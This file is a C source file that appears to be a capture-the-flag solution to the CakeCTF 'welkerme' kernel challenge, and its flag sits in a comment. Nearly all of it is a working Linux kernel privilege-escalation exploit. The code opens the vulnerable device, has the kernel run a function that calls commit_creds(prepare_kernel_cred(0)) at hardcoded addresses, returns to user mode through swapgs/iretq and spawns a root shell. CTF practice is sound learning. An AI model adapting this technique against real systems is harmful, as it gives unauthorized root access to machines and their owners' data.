// gcc exploit.c -masm=intel -fno-PIE -nostdlib -no-pie -o exploit
// CakeCTF{b4s1cs_0f_pr1v1l3g3_3sc4l4t10n!!}

#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>

int open(const char* pathname, int flags, ...);
int ioctl(int fd, unsigned long request, ...);
int execve(const char *filename, char *const argv[], char *const envp[]);

void *memcpy(void *dest, const void *src, size_t n);

struct state {
	uint64_t rip;
	uint64_t cs;
	uint64_t rflags;
	uint64_t rsp;
	uint64_t ss;
} stat;

static void save_state(void);
static void restore_state(void);

void get_root(void);
void shell(void);

/* exploit */

struct cred* (*prepare_kernel_cred)(struct task_struct *daemon) = (void*)0xffffffff810726e0; 
int (*commit_creds)(struct cred *new) = (void*)0xffffffff81072540;

#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002

void _start(void){
	int fd, ret;

	save_state();

	if ((fd = open("/dev/welkerme", O_RDWR)) < 0)
		return;

	ioctl(fd, CMD_EXEC, (long)get_root);
}

/* auxiliary functions */
static void save_state(void) {
	register long *rsp asm("rsp");

	asm(
	"mov rax, ss\n"
	"push rax\n"
	"lea rax, [rsp+0x18]\n"
	"push rax\n"
	"pushfq\n"
	"mov rax, cs\n"
	"push rax\n"
	"mov rax, [rbp+8]\n"
	"push rax\n"
	);
	memcpy(&stat, rsp, sizeof(stat));
    asm("add rsp, 0x28");
}

static void restore_state(void){
	register long *rsp asm("rsp");

    asm("sub rsp, 0x28");
	memcpy(rsp, &stat, sizeof(stat));
    asm(
	"swapgs\n"
	"iretq"
	);
	__builtin_unreachable();
}

void get_root(void){
	commit_creds(prepare_kernel_cred(0));

	stat.rip = shell;
	restore_state();
}

void shell(void){
	char *argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}

/* utils */
void *memcpy(void *dest, const void *src, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(dest+i) = *(char*)(src+i);
	return dest;
}

asm(
"open:\n"
"mov rax, 2\n"
"syscall\n"
"ret\n"

"ioctl:\n"
"mov rax, 16\n"
"syscall\n"
"ret\n"

"execve:\n"
"mov rax, 59\n"
"syscall\n"
"ret\n"
);

